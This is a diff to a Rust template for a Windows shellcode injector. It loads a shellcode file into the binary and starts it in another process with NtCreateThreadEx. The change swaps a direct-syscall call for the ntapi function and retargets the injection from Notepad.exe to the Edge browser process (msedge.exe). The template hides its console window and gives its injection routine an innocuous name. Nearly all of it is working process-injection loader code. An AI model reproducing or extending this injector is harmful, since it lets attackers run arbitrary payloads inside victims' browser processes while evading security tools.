@@ -1,4 +1,5 @@
 //#![windows_subsystem = "windows"]
+// TODO: remove all debug info
 
 use std::include_bytes;
 use std::{ptr::null_mut};
@@ -17,7 +18,7 @@ use winapi::{
     }
 };
 use ntapi::winapi::ctypes::c_void;
-use winapi::shared::ntdef::NULL;
+use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{IMPORTS}}
 
@@ -77,9 +78,8 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
 
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let base_address : *mut c_void = null_mut();
         let lol: *mut c_void = null_mut();
-        
+        /* 
         let write_thread = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle,
@@ -94,8 +94,8 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
             0, 
             lol
         );
-        
-        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        */
+        let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
         if !NT_SUCCESS(write_thread) {
             let last_error = GetLastError();
             println!("{}", last_error);
@@ -107,7 +107,7 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "Notepad.exe";
+    let tar: &str = "msedge.exe";
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
